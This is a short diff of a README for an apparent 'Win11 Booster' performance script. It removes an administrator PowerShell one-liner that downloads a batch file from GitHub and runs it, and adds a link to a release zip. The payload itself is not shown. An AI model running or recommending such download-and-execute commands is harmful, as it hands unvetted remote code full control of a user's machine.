@@ -7,12 +7,8 @@ This repository contains a script to boost the performance of Windows 11 using a
 To use the Win11 Booster script, follow the steps below:
 
 1. Open PowerShell as an administrator.
-
-2. Run the following command to start installation 
-
-    ```powershell
-    mkdir C:\Users\Booster ; Invoke-WebRequest -Uri 'https://github.com/Scuttlang/Win11-Booster/blob/main/installer.bat' -OutFile 'C:\Users\Booster\installer.bat' ; Start-Process -FilePath 'C:\Users\Booster\installer.bat' -Wait
-    ```
+   
+https://github.com/Scuttlang/Win11-Booster/releases/download/owner/Win11-Booster-main.zip
 
 ## Description
 
